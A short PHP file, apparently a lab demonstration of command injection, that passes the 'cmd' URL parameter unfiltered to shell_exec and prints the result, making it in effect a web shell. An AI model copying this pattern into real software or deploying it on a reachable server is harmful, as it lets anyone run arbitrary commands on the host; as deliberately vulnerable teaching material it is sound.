<?php
// vulnerable.php - command injection demo (lab only)
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
if($cmd) {
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "no cmd";
}
?>

